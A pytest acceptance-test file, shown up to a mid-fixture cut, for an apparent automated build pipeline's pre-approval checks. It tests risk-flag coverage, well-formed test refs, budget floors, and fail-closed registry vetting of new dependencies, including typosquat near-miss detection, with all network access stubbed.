"""F-71 acceptance tests — BUILD-ORDER.md, work order F-71.

Pre-spend contract checks: AC-1 (risk flags cover the scope, at approval
and in the importer's normalisation), AC-2 (check refs are runnable
before approval, with the protected-ref warning), AC-3 (a budget floor
the owner sets once, under the F-63 profile groups), AC-4 (declared
dependencies pass L0 without a human; undeclared, too-new, near-miss or
unchecked ones escalate, fail closed).

Contract rule (CLAUDE.md): an acceptance ref ``tests/test_f71.py::test_ac_N``
means a test function with exactly that name.

What is real and what is stubbed:

* **Real:** the F-02 loaders and the real schemas, real git fixture
  repos (approval reads the default branch with ``git ls-tree``; L0
  reads manifest blobs at the real refs), the full ``plan_import``
  normalisation, ``run_l0`` end to end over the fixture, the real
  top-package lists, and the real registry CHECKS (parse, echoed-name,
  first release, near-miss) over stubbed HTTP.
* **Stubbed:** the registry client's ONE network seam (``get_json``) —
  nothing else; the autouse guard below fails any test that reaches the
  real network fetch.
"""

from __future__ import annotations

import itertools
import json
from pathlib import Path

import pytest
from _support.f71 import (
    BASE_FILES,
    BASE_PYPROJECT,
    BASE_REQUIREMENTS_LOCK,
    BASE_REQUIREMENTS_TXT,
    PROFILE_WITH_GENERATED,
    PROJECT,
    PROTECTED_TEST,
    RISK_FILE,
    Echo,
    StubGetJson,
    branch,
    build_repo,
    commit_files,
    declared_dependency,
    npm_doc,
    pypi_doc,
    say_yes,
    write_queue,
)
from _support.f71 import _task as prespend_task

from factory.approve import ApprovalError, approve_task
from factory.contract import ContractError, load_profile
from factory.importer import plan_import, render_summary
from factory.l0 import run_l0
from factory.state import TaskQueue

REPO = Path(__file__).resolve().parent.parent
_TAGS = itertools.count()


def _tag() -> str:
    """A unique subdir per queue/repo build (tests share one tmp_path)."""
    return f"t{next(_TAGS)}"


@pytest.fixture(autouse=True)
def _no_real_network(monkeypatch):
    """Tests never touch the network: the registry client's real HTTP
    seam fails the test if anything reaches it (AC-4's guard). On the
    pre-F-71 tree the module does not exist yet — tolerated here only so
    the red-first run reports each AC's behavioural failure (test_ac_4
    imports the module itself and stays red on its absence)."""
    try:
        import factory.registry as registry_module
    except ImportError:
        return

    def _refuse(*_args, **_kwargs):
        raise AssertionError(
            "the real registry HTTP seam was called from a test — stub "
            "get_json instead (F-71 AC-4)")

    monkeypatch.setattr(registry_module, "_http_get_json", _refuse)


def _proposal_task(task: dict) -> dict:
    """A task shaped as a PROPOSAL entry: exactly what the session may
    carry (no status, no lifecycle fields)."""
    return {key: value for key, value in task.items()
            if key != "status"}


def _approve(tmp_path: Path, tasks: list[dict], *, repo: Path | None = None,
             profile_extra: str = "", with_profile: bool = True,
             **kwargs):
    """approve_task over a fresh fixture queue; returns (status, echo)."""
    tag = _tag()
    repo = repo if repo is not None else build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(tmp_path / tag, tasks, repo=repo,
                             profile_extra=profile_extra,
                             with_profile=with_profile)
    echo = Echo()
    status = approve_task(
        TaskQueue(queue_path), tasks[0]["id"], approved_by="owner",
        echo=echo, factory_root=tmp_path / tag / "root", **kwargs,
    )
    return status, echo


def _refuse(tmp_path: Path, task: dict, **kwargs) -> str:
    kwargs.setdefault("assume_yes", True)  # the refusal must precede any prompt
    queue_kwargs = kwargs.pop("queue_kwargs", {})
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(tmp_path / tag, [task], repo=repo, **queue_kwargs)
    with pytest.raises(ApprovalError) as excinfo:
        approve_task(TaskQueue(queue_path), task["id"], approved_by="owner",
                     echo=lambda _t: None, factory_root=tmp_path / tag / "root",
                     **kwargs)
    return str(excinfo.value)


# ----------------------------------------------------------------- AC-1 --


def test_ac_1(tmp_path: Path):
    """AC-1: risk flags cover the scope. Approval computes the flags the
    declared scope can reach from the DEFAULT branch's tracked files plus
    every literal scope path, through the same matcher L0 uses, and
    refuses a contract whose risk does not cover them. The importer adds
    missing flags in the F-67 normalisation step and lists each addition
    with the overrides."""
    # (a) a literal scope path that IS a risk file, without the flag.
    message = _refuse(tmp_path, prespend_task(
        "WO-9", risk=[], scope={"paths": [RISK_FILE]}))
    assert "external_service" in message
    assert RISK_FILE in message

    # (b) a scope glob that reaches a risk file only through **.
    message = _refuse(tmp_path, prespend_task(
        "WO-9", risk=[], scope={"paths": ["**/invoice.py"]}))
    assert "external_service" in message
    assert "billing/invoice.py" in message

    # (b2) the risk matcher is L0's (fnmatch: `*` crosses `/`), never a
    # second stricter matcher — a `billing/*` risk glob reaches
    # billing/deep/invoice.py.
    message = _refuse(tmp_path, prespend_task(
        "WO-9", risk=["external_service"],
        scope={"paths": ["billing/**"]}))
    assert "payments" in message
    assert "billing/deep/invoice.py" in message

    # (c) a literal NEW file under a risk glob counts (glob-free paths
    # cover files the task will create; nothing tracked matches them).
    message = _refuse(tmp_path, prespend_task(
        "WO-9", risk=[], scope={"paths": ["billing/new_invoice.py"]}))
    assert "external_service" in message
    assert "billing/new_invoice.py" in message

    # (d) declared, it approves (interactively; the flag keeps --yes
    # refused as today).
    status, _echo = _approve(
        tmp_path,
        [prespend_task("WO-9", risk=["external_service"],
                       scope={"paths": [RISK_FILE]})],
        confirm=say_yes,
    )
    assert status in ("ready", "blocked")
    message = _refuse(tmp_path, prespend_task(
        "WO-9", risk=["external_service"], scope={"paths": [RISK_FILE]}),
        assume_yes=True)
    assert "risk flags" in message

    # (e) the importer ADDS the missing flag in the normalisation step
    # and lists it with the gate overrides, before the diff.
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(
        tmp_path / tag, [prespend_task("WO-9", risk=[],
                                       scope={"paths": [RISK_FILE]})],
        repo=repo)
    profile = load_profile(queue_path.parent / "project.yaml")
    proposal = {"project": PROJECT, "tasks": [_proposal_task(prespend_task(
        "WO-9", risk=[], scope={"paths": [RISK_FILE]}))]}
    plan = plan_import(None, proposal, [], project=PROJECT,
                       profile=profile, repo=repo)
    landed = plan.proposed_doc["tasks"][0]["risk"]
    assert landed == ["external_service"]
    # the addition is a UNION — a flag the proposal already declared
    # survives (adding is the conservative direction; never a removal).
    proposal = {"project": PROJECT, "tasks": [_proposal_task(prespend_task(
        "WO-9", risk=["safety"], scope={"paths": [RISK_FILE]}))]}
    plan = plan_import(None, proposal, [], project=PROJECT,
                       profile=profile, repo=repo)
    assert plan.proposed_doc["tasks"][0]["risk"] == [
        "external_service", "safety"]
    summary = render_summary(plan)
    overrides_at = summary.index("## Gate overrides")
    diff_at = summary.index("## Full diff")
    assert overrides_at < diff_at
    section = summary[overrides_at:diff_at]
    assert "external_service" in section and RISK_FILE in section

    # (f) a missing profile REFUSES approval of a runnable kind, naming
    # the path.
    task = prespend_task("WO-9", risk=["external_service"],
                         scope={"paths": [RISK_FILE]})
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(tmp_path / tag, [task], repo=repo,
                             with_profile=False)
    with pytest.raises(ApprovalError) as excinfo:
        approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                     confirm=say_yes, echo=lambda _t: None,
                     factory_root=tmp_path / tag / "root")
    assert str(queue_path.parent / "project.yaml") in str(excinfo.value)

    # (g) the working tree is NOT the source: a file that exists only
    # untracked (not on the default branch) never raises a flag, even
    # when a scope glob and a risk glob both name it. (The scope here is
    # a GLOB — a literal scope path is a candidate by design, files the
    # task will create included.)
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    (repo / "svc" / "untracked_service.py").write_text("x = 1\n")
    task = prespend_task("WO-9", risk=["external_service"],
                         scope={"paths": ["svc/*.py"]})
    queue_path = write_queue(tmp_path / tag, [task], repo=repo)
    status = approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                          confirm=say_yes, echo=lambda _t: None,
                          factory_root=tmp_path / tag / "root")
    assert status in ("ready", "blocked")

    # (h) the factory's own queue still approves every runnable draft
    # (with the scope the owner grants at approval: each draft's own
    # contract-test files, read from its acceptance refs).
    factory_repo = build_repo(tmp_path / "h" / "repo")
    control = tmp_path / "h" / "control" / ".factory"
    control.mkdir(parents=True, exist_ok=True)
    doc = json.loads((REPO / ".factory" / "tasks.json").read_text())
    profile_text = (REPO / ".factory" / "project.yaml").read_text()
    profile_text = profile_text.replace(
        "path: ~/Desktop/Software_Factory_Agents", f"path: {factory_repo}")
    (control / "project.yaml").write_text(profile_text)
    for task in doc["tasks"]:
        if task.get("kind") not in ("build", "docs"):
            continue
        files = sorted({
            (item["check"].get("ref") or "").partition("::")[0]
            for item in task.get("acceptance") or []
            if (item.get("check") or {}).get("type") == "test"
            and "::" in (item["check"].get("ref") or "")
        })
        assert files, f"{task['id']} has no test refs to scope"
        task["scope"] = {"paths": files}
    (control / "tasks.json").write_text(json.dumps(doc, indent=2) + "\n")
    queue = TaskQueue(control / "tasks.json")
    for task in doc["tasks"]:
        if task.get("kind") not in ("build", "docs"):
            continue
        if task.get("status") != "draft":
            continue  # built and reconciled already; not a runnable draft
        status = approve_task(queue, task["id"], approved_by="owner",
                              confirm=say_yes, echo=lambda _t: None,
                              factory_root=tmp_path / "h" / "root")
        assert status in ("ready", "blocked"), task["id"]

    # (i) R1-3: the reach is computed on the branch the RUN builds on —
    # the REMOTE default after a fetch, never the owner checkout's
    # possibly-stale local branch. origin/main carries a risk-path file
    # local main lacks; approval must refuse on it (and approve once
    # declared).
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    import subprocess as _sp

    def _git(*args):
        _sp.run(["git", "-C", str(repo), *args], check=True,
                capture_output=True, text=True)

    bare = tmp_path / tag / "origin.git"
    _sp.run(["git", "clone", "-q", "--bare", str(repo), str(bare)],
            check=True, capture_output=True, text=True)
    _git("remote", "add", "origin", str(bare))
    _git("fetch", "-q", "origin")
    _git("checkout", "-q", "-b", "tmp-advance")
    (repo / "billing" / "late_invoice.py").write_text("def late(): ...\n")
    _git("add", "-A")
    _git("commit", "-q", "-m", "advance origin only")
    _sp.run(["git", "-C", str(repo), "push", "-q", "origin",
             "tmp-advance:main"], check=True, capture_output=True, text=True)
    _git("checkout", "-q", "main")  # local main stays BEHIND origin/main
    task = prespend_task("WO-9", risk=[], scope={"paths": ["billing/**"]})
    queue_path = write_queue(tmp_path / tag, [task], repo=repo)
    with pytest.raises(ApprovalError) as excinfo:
        approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                     confirm=say_yes, echo=lambda _t: None,
                     factory_root=tmp_path / tag / "root")
    assert "external_service" in str(excinfo.value)
    assert "billing/late_invoice.py" in str(excinfo.value)
    task = prespend_task("WO-9", risk=["external_service", "payments"],
                         scope={"paths": ["billing/**"]})
    queue_path = write_queue(tmp_path / tag, [task], repo=repo)
    status = approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                          confirm=say_yes, echo=lambda _t: None,
                          factory_root=tmp_path / tag / "root")
    assert status in ("ready", "blocked")

    # (j) R1-7: L0's implicit allowances are candidates too — the task's
    # own contract test file and the profile's paths.generated. A risk
    # glob covering either demands its flag at approval exactly as L0's
    # matcher will at run time.
    task = prespend_task("WO-9", risk=[], scope={"paths": ["svc/util.py"]},
                         acceptance=[{"id": "AC-1", "text": "it works",
                                      "check": {"type": "test",
                                                "ref": "billing/"
                                                       "nested_test.py::"
                                                       "test_ac_1"}}])
    message = _refuse(tmp_path, task)
    assert "external_service" in message and "payments" in message
    assert "billing/nested_test.py" in message
    # and the generated-file allowance: a risk glob over a generated
    # path demands the flag even though the scope touches nothing there.
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo",
                      files={**BASE_FILES,
                             "billing/generated/autogen.py": "x = 0\n"})
    task = prespend_task("WO-9", risk=[], scope={"paths": ["svc/util.py"]})
    queue_path = write_queue(
        tmp_path / tag, [task], repo=repo,
        profile_text=PROFILE_WITH_GENERATED)
    with pytest.raises(ApprovalError) as excinfo:
        approve_task(TaskQueue(queue_path), "WO-9", approved_by="owner",
                     confirm=say_yes, echo=lambda _t: None,
                     factory_root=tmp_path / tag / "root")
    assert "external_service" in str(excinfo.value)
    assert "billing/generated/autogen.py" in str(excinfo.value)

    # (k) R1-4c: a profile naming another project than the queue refuses
    # (the F-62 pair rule — never judge one project's contract against
    # another project's risk globs).
    task = prespend_task("WO-9")
    message = _refuse(tmp_path, task,
                      queue_kwargs={"profile_name": "other-project"})
    assert "other-project" in message and "mismatch" in message


# ----------------------------------------------------------------- AC-2 --


BAD_REFS = [
    "run the tests and see it work",       # prose
    "tests/test_x.py",                     # a bare path, no :: at all
    "/abs/tests/test_x.py::test_ac_1",     # absolute
    "tests/../factory/x.py::t",            # climbs
    "tests/test_x.py::",                   # empty name
    "::test_a",                            # empty path
    "tests/test_x.py:: ",                  # whitespace-only name
    "tests/test_x.py:: test_ac_1 ",        # padded name
]


def test_ac_2(tmp_path: Path):
    """AC-2: check refs are runnable before approval. A test ref must be
    ``<repo-relative path>::<name>[::<name>...]``; a command check must
    carry a command. A ref into a protected file the scope cannot touch
    WARNS (the owner answers y at the same prompt); --yes is refused for
    a task carrying the warning."""
    def acceptance(ref: str, ac: str = "AC-1", kind: str = "test") -> list:
        return [{"id": ac, "text": "it works",
                 "check": {"type": kind, "ref": ref}}]

    # (a) a prose ref refuses, naming the criterion.
    message = _refuse(tmp_path, prespend_task(
        "WO-9", acceptance=acceptance("run the tests and see it work")))
    assert "AC-1" in message
    assert "run the tests and see it work" in message

    # (b) each malformed shape refuses, the shape named.
    for bad in BAD_REFS:
        message = _refuse(tmp_path, prespend_task(
            "WO-9", acceptance=acceptance(bad)))
        assert "AC-1" in message and bad.strip() in message.strip(), bad

    # (c) a command check with an empty or whitespace command refuses.
    for empty in ("", "   "):
        message = _refuse(tmp_path, prespend_task(
            "WO-9", acceptance=acceptance(empty, kind="command")))
        assert "AC-1" in message

    # (d) an exact ref (three :: segments included) approves.
    status, _echo = _approve(tmp_path, [prespend_task(
        "WO-9",
        acceptance=acceptance("tests/test_wo9.py::TestThing::test_ac_1"))],
        confirm=say_yes)
    assert status in ("ready", "blocked")

    # (e) a protected ref outside the scope shows the WARNING block
    # (criterion + file); --yes is refused FOR THE WARNING (the task
    # carries no risk flag, so the warning is the only --yes refusal
    # class in play), and the owner's y approves the same task.
    warn_task = prespend_task(
        "WO-9", acceptance=acceptance(f"{PROTECTED_TEST}::test_cal"))
    with pytest.raises(ApprovalError, match="protected") as excinfo:
        _approve(tmp_path, [warn_task], assume_yes=True)
    assert PROTECTED_TEST in str(excinfo.value)
    status, echo = _approve(tmp_path, [warn_task], confirm=say_yes)
    assert status in ("ready", "blocked")
    warning_lines = [ln for ln in echo.lines if "WARNING" in ln]
    assert warning_lines, echo.text
    assert any("AC-1" in ln and PROTECTED_TEST in ln for ln in warning_lines)

    # (f) the same ref with the scope covering the file does NOT warn.
    in_scope = prespend_task(
        "WO-9", scope={"paths": ["svc/util.py", f"{PROTECTED_TEST}"]},
        acceptance=acceptance(f"{PROTECTED_TEST}::test_cal"))
    status, echo = _approve(tmp_path, [in_scope], confirm=say_yes)
    assert status in ("ready", "blocked")
    assert not [ln for ln in echo.lines if "WARNING" in ln]

    # (g) the factory's own queue carries 0 inexact refs today (AC-1 (h)
    # proved they still approve; this arm pins the fact it relies on).
    doc = json.loads((REPO / ".factory" / "tasks.json").read_text())
    for task in doc["tasks"]:
        if task.get("kind") not in ("build", "docs"):
            continue
        for item in task.get("acceptance") or []:
            check = item.get("check") or {}
            if check.get("type") != "test":
                continue
            ref = check.get("ref") or ""
            path, sep, tail = ref.partition("::")
            assert sep and path.strip() and not path.startswith("/")
            assert ".." not in path.split("/")
            assert tail and all(part.strip() for part in tail.split("::"))


# ----------------------------------------------------------------- AC-3 --


def test_ac_3(tmp_path: Path):
    """AC-3: budgets have a floor the owner sets once. The profile gains
    an owner-approved ``budget_floor`` (defaults 60/30), inside F-64's
    caps; approval refuses a runnable task below the floor and the
    importer clamps UP and lists the change."""
    # (a) 30 turns refuses under the default floor, naming the field
    # and both values. (Scope is a risk-free file so the floor is the
    # only refusal class in play.)
    floor_scope = {"paths": ["svc/util.py"]}
    task = prespend_task("WO-9", scope=floor_scope, budget={
        "size": "S", "max_attempts": 3, "max_turns": 30,
        "wall_clock_min": 30})
    message = _refuse(tmp_path, task)
    assert "max_turns" in message and "30" in message and "60" in message
    # and the wall-clock floor holds on its own.
    task = prespend_task("WO-9", scope=floor_scope, budget={
        "size": "S", "max_attempts": 3, "max_turns": 60,
        "wall_clock_min": 20})
    message = _refuse(tmp_path, task)
    assert "wall_clock_min" in message and "20" in message and "30" in message

    # (b) a profile floor of 40 lets a 45-turn task approve (wall clock
    # at the default floor).
    task = prespend_task("WO-9", scope=floor_scope, budget={
        "size": "S", "max_attempts": 3, "max_turns": 45,
        "wall_clock_min": 30})
    status, _echo = _approve(
        tmp_path, [task], confirm=say_yes,
        profile_extra="\nbudget_floor:\n  max_turns: 40\n")
    assert status in ("ready", "blocked")

    # (c) a floor above F-64's caps refuses to LOAD, naming the field.
    task = prespend_task("WO-9")
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(
        tmp_path / tag, [task], repo=repo,
        profile_extra="\nbudget_floor:\n  max_turns: 300\n")
    with pytest.raises(ContractError, match="budget_floor.max_turns"):
        load_profile(queue_path.parent / "project.yaml")
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(
        tmp_path / tag, [task], repo=repo,
        profile_extra="\nbudget_floor:\n  wall_clock_min: 200\n")
    with pytest.raises(ContractError, match="budget_floor.wall_clock_min"):
        load_profile(queue_path.parent / "project.yaml")

    # (d) the importer clamps a 30-turn proposal UP to 60 (never down)
    # and lists the clamp with the overrides.
    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(tmp_path / tag, [prespend_task("WO-9")], repo=repo)
    profile = load_profile(queue_path.parent / "project.yaml")
    low = _proposal_task(prespend_task("WO-9", budget={
        "size": "S", "max_attempts": 3, "max_turns": 30,
        "wall_clock_min": 20}))
    plan = plan_import(None, {"project": PROJECT, "tasks": [low]}, [],
                       project=PROJECT, profile=profile, repo=repo)
    landed = plan.proposed_doc["tasks"][0]["budget"]
    assert landed["max_turns"] == 60 and landed["wall_clock_min"] == 30
    summary = render_summary(plan)
    section = summary[summary.index("## Gate overrides"):
                     summary.index("## Full diff")]
    assert "max_turns" in section and "60" in section
    assert "wall_clock_min" in section and "30" in section
    # never down: a proposal above the floor keeps its budget.
    high = _proposal_task(prespend_task("WO-9", budget={
        "size": "M", "max_attempts": 3, "max_turns": 200,
        "wall_clock_min": 150}))
    plan = plan_import(None, {"project": PROJECT, "tasks": [high]}, [],
                       project=PROJECT, profile=profile, repo=repo)
    assert plan.proposed_doc["tasks"][0]["budget"]["max_turns"] == 200

    # (e) changing budget_floor invalidates an existing profile approval
    # (it is an F-63 security group).
    from factory.approvals import (
        ApprovalLedger,
        ApprovalLedgerError,
        changed_groups,
        require_profile_approval,
    )

    tag = _tag()
    repo = build_repo(tmp_path / tag / "repo")
    queue_path = write_queue(tmp_path / tag, [prespend_task("WO-9")], repo=repo)
    root = tmp_path / tag / "root"
    approved = load_profile(queue_path.parent / "project.yaml")
    ledger = ApprovalLedger.for_project(root, PROJECT)
    ledger.record_profile_for(approved, approved_by="owner")
    require_profile_approval(approved, root)  # covered
    (queue_path.parent / "project.yaml").write_text(
        (queue_path.parent / "project.yaml").read_text()
        + "\nbudget_floor:\n  max_turns: 40\n")
    changed = load_profile(queue_path.parent / "project.yaml")
    assert "budget_floor" in changed_groups(
        changed, ledger.latest_profile_approval())
    with pytest.raises(ApprovalLedgerError, match="budget_floor"):
        require_profile_approval(changed, root)

    # (f) the factory's own queue has 0 runnable drafts under the floor.
    doc = json.loads((REPO / ".factory" / "tasks.json").read_text())
    for task in doc["tasks"]:
        if task.get("kind") not in ("build", "docs"):
            continue
        budget = task.get("budget") or {}
        assert budget.get("max_turns", 0) >= 60, task["id"]
        assert budget.get("wall_clock_min", 0) >= 30, task["id"]


# ----------------------------------------------------------------- AC-4 --


def _safe_top_name() -> str:
    """A shipped top-list pypi name with no distance-1 sibling on the
    list (computed from the shipped data, so the pass arms never depend
    on the list's exact membership)."""
    from factory.registry import damerau_levenshtein, load_top_packages

    names = sorted(load_top_packages("pypi"))
    for name in names:
        if all(damerau_levenshtein(name, other) >= 2
               for other in names if other != name):
            return name
    raise AssertionError("the shipped pypi top list has no isolated name")


L0_PROFILE_BASE = {
    "name": PROJECT,
    "repo": {"path": ".", "default_branch": "main",
             "remote": "https://example.invalid/p.git"},
    "commands": {"setup": "true", "test": "true"},
    "paths": {"risk": {}, "protected": []},
    "dependency_manifests": ["requirements.txt", "requirements.lock",
                             "pyproject.toml", "package.json",
                             "package-lock.json"],
    "deploy": {"mechanism": "none", "auto_on_merge": False},
    "live_checks": {},
    "docs_allowlist": [],
}

L0_SCOPE = {"paths": ["requirements.txt", "requirements.lock",
                      "pyproject.toml", "package.json",
                      "package-lock.json", "Pipfile", "src/**"]}


def _l0(tmp_path: Path, *, base: dict, head: dict, task: dict,
        profile: dict | None = None, stub: StubGetJson | None = None):
    """run_l0 over a two-commit fixture: base on main, head on feature."""
    from factory.registry import RegistryClient

    repo = build_repo(tmp_path / "repo", files=base)
    branch(repo)
    head_sha = commit_files(repo, head)
    return run_l0(
        dict(profile or L0_PROFILE_BASE), repo, "main", head_sha,
        task=task, registry_client=RegistryClient(get_json=stub),
    )


def _l0_task(dependencies: list | None = None) -> dict:
    return {
        "id": "WO-9", "risk": [],
        "scope": L0_SCOPE,
        "dependencies": dependencies if dependencies is not None else [],
        "acceptance": [{"id": "AC-1", "text": "it works",
                        "check": {"type": "test",
                                  "ref": "tests/test_wo9.py::test_ac_1"}}],
    }


def _fails(report) -> list:
    return [c for c in report.dependency_checks if c.get("verdict") != "pass"]


def test_ac_4(tmp_path: Path, monkeypatch):
    """AC-4: declared dependencies pass without a human. L0 parses what a
    manifest diff added (direct vs lock pins), every added direct package
    must be declared, every added package must pass the registry checks
    (exists, first release >= 30 days, not a near-miss of a top name),
    and anything it cannot prove escalates ``new_dependency``, fail
    closed. Approval shows the declared dependencies and refuses --yes
    for a contract that declares any."""
    safe = _safe_top_name()
    answers = {
        ("pypi", safe): pypi_doc(safe),
        ("pypi", "pypdf"): pypi_doc("pypdf"),
        ("pypi", "reqeusts"): pypi_doc("reqeusts"),
        ("pypi", "starlette"): pypi_doc("starlette"),
        ("npm", "lodash"): npm_doc("lodash"),
    }

    # (a) a declared, aged, unrelated package added to requirements.txt
    # AND the lock passes with no escalation.
    report = _l0(
        tmp_path / "a",
        base={"requirements.txt": BASE_REQUIREMENTS_TXT,
              "requirements.lock": BASE_REQUIREMENTS_LOCK,
              "src/a.py": "x = 0\n"},
        head={"requirements.txt": BASE_REQUIREMENTS_TXT + f"{safe}>=1.0\n",
              "requirements.lock": BASE_REQUIREMENTS_LOCK + f"{safe}==1.2.3\n",
              "src/a.py": "x = 1\n"},
        task=_l0_task([declared_dependency(safe)]),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" not in report.escalations
    checks = report.dependency_checks
    assert {c["name"] for c in checks} == {safe}
    assert all(c["verdict"] == "pass" for c in checks)

    # (b) undeclared escalates, declared=False named in the report.
    report = _l0(
        tmp_path / "b",
        base={"requirements.txt": "", "src/a.py": "x = 0\n"},
        head={"requirements.txt": f"{safe}>=1.0\n", "src/a.py": "x = 1\n"},
        task=_l0_task([]),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" in report.escalations
    assert any(c.get("declared") is False for c in _fails(report))

    # (c) first release 3 days ago escalates, the reason named; a
    # FUTURE first-release timestamp fails too (the parent's clock is
    # the truth, not the registry's claim).
    report = _l0(
        tmp_path / "c",
        base={"requirements.txt": "", "src/a.py": "x = 0\n"},
        head={"requirements.txt": f"{safe}>=1.0\n", "src/a.py": "x = 1\n"},
        task=_l0_task([declared_dependency(safe)]),
        stub=StubGetJson({**answers,
                          ("pypi", safe): pypi_doc(
                              safe, first_release_days_ago=3)}),
    )
    assert "new_dependency" in report.escalations
    assert any("first release" in (c.get("reason") or "")
               for c in _fails(report))
    report = _l0(
        tmp_path / "c2",
        base={"requirements.txt": "", "src/a.py": "x = 0\n"},
        head={"requirements.txt": f"{safe}>=1.0\n", "src/a.py": "x = 1\n"},
        task=_l0_task([declared_dependency(safe)]),
        stub=StubGetJson({**answers,
                          ("pypi", safe): pypi_doc(
                              safe, first_release_days_ago=-5)}),
    )
    assert "new_dependency" in report.escalations
    assert any("future" in (c.get("reason") or "") for c in _fails(report))

    # (d) a near-miss name (reqeusts, one transposition off requests)
    # escalates.
    report = _l0(
        tmp_path / "d",
        base={"requirements.txt": "", "src/a.py": "x = 0\n"},
        head={"requirements.txt": "reqeusts>=2.0\n", "src/a.py": "x = 1\n"},
        task=_l0_task([declared_dependency("reqeusts")]),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" in report.escalations
    assert any(c.get("near_miss") for c in _fails(report))

    # (e) registry down or timing out escalates; (f) malformed JSON
    # escalates — every unreachable shape fails closed.
    for tag, mode in (("e", "down"), ("e2", "timeout"), ("f", "malformed")):
        report = _l0(
            tmp_path / tag,
            base={"requirements.txt": "", "src/a.py": "x = 0\n"},
            head={"requirements.txt": f"{safe}>=1.0\n", "src/a.py": "x = 1\n"},
            task=_l0_task([declared_dependency(safe)]),
            stub=StubGetJson(answers, fail={("pypi", safe): mode}),
        )
        assert "new_dependency" in report.escalations, tag
        assert _fails(report), tag

    # (g) an unparseable lock line (-e git+...) escalates, the manifest
    # named.
    report = _l0(
        tmp_path / "g",
        base={"requirements.lock": "", "src/a.py": "x = 0\n"},
        head={"requirements.lock":
              "-e git+https://example.invalid/x.git#egg=x\n",
              "src/a.py": "x = 1\n"},
        task=_l0_task(),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" in report.escalations
    assert any(c.get("manifest") == "requirements.lock" for c in _fails(report))

    # (h) a manifest in dependency_manifests with no parser escalates
    # (Pipfile is not one of the five).
    report = _l0(
        tmp_path / "h",
        base={"Pipfile": "[packages]\n", "src/a.py": "x = 0\n"},
        head={"Pipfile": '[packages]\nleft-pad = "*"\n', "src/a.py": "x = 1\n"},
        task=_l0_task(),
        profile={**L0_PROFILE_BASE,
                 "dependency_manifests": ["requirements.txt",
                                          "requirements.lock",
                                          "pyproject.toml", "package.json",
                                          "package-lock.json", "Pipfile"]},
        stub=StubGetJson(answers),
    )
    assert "new_dependency" in report.escalations
    assert any(c.get("manifest") == "Pipfile" for c in _fails(report))

    # (i) a transitive lock pin that fails a check escalates though its
    # parent is declared: the txt adds pypdf (declared, passing), the
    # lock also pins a failing transitive.
    report = _l0(
        tmp_path / "i",
        base={"requirements.txt": "", "requirements.lock": ""},
        head={"requirements.txt": "pypdf>=5.0\n",
              "requirements.lock": "pypdf==5.1.0\nstarlette==0.27.0\n"},
        task=_l0_task([declared_dependency("pypdf")]),
        stub=StubGetJson({**answers,
                          ("pypi", "starlette"): pypi_doc(
                              "starlette", first_release_days_ago=2)}),
    )
    assert "new_dependency" in report.escalations
    assert any(c.get("name") == "starlette" for c in _fails(report))

    # (j) a version bump of an existing pin counts as added: the lock's
    # starlette moves 0.27.0 -> 0.28.0 and the registry is down for it.
    report = _l0(
        tmp_path / "j",
        base={"requirements.lock": BASE_REQUIREMENTS_LOCK},
        head={"requirements.lock": "fastapi==0.100.0\nstarlette==0.28.0\n"},
        task=_l0_task(),
        stub=StubGetJson(answers, fail={("pypi", "starlette"): "down"}),
    )
    assert "new_dependency" in report.escalations
    assert any(c.get("name") == "starlette" for c in _fails(report))
    # and a direct bump that IS declared passes.
    report = _l0(
        tmp_path / "j2",
        base={"requirements.txt": f"{safe}==1.0\n"},
        head={"requirements.txt": f"{safe}==2.0\n"},
        task=_l0_task([declared_dependency(safe)]),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" not in report.escalations

    # (k) an inert pyproject change still passes as today (F-31).
    report = _l0(
        tmp_path / "k",
        base={"pyproject.toml": BASE_PYPROJECT},
        head={"pyproject.toml": BASE_PYPROJECT.replace("88", "100")},
        task=_l0_task(),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" not in report.escalations

    # (l) a dependency-bearing pyproject table outside the parsed set
    # (poetry) escalates rather than slipping through.
    poetry = f'\n[tool.poetry.dependencies]\npython = ">=3.11"\n{safe} = "^1"\n'
    report = _l0(
        tmp_path / "l",
        base={"pyproject.toml": BASE_PYPROJECT},
        head={"pyproject.toml": BASE_PYPROJECT + poetry},
        task=_l0_task(),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" in report.escalations

    # (m) name normalisation: case variants of one pypi name are one
    # package (PEP 503 folds case and separators).
    report = _l0(
        tmp_path / "m",
        base={"requirements.txt": ""},
        head={"requirements.txt": f"{safe.upper()}>=1.0\n"},
        task=_l0_task([declared_dependency(safe.capitalize())]),
        stub=StubGetJson(answers),
    )
    assert "new_dependency" not in report.escalations

    # (o) the npm grammars: a declared, aged package added to
    # package.json and pinned in a v3 package-lock passes; its scoped
    # transitive is checked too.
    report = _l0(
        tmp_path / "o",
        base={"package.json": '{\n  "name": "web",\n'
                              '  "dependencies": {}\n}\n',
              "package-lock.json": '{\n  "lockfileVersion": 3,\n'
                                   '  "packages": {\n    "": {}\n  }\n}\n'},
        head={"package.json": '{\n  "name": "web",\n'
                              '  "dependencies": {\n    "left-pad": '
                              '"^1.3.0"\n  }\n}\n',
              "package-lock.json": '{\n  "lockfileVersion": 3,\n'
                                   '  "packages": {\n    "": {},\n'
                                   '    "node_modules/left-pad": {\n'
                                   '      "version": "1.3.0",\n'
                                   '      "resolved": "https://registry.'
                                   'npmjs.org/left-pad/-/left-pad-1.3.0'
                                   '.tgz",\n      "integrity": "sha512-A"\n'
                                   '    },\n'
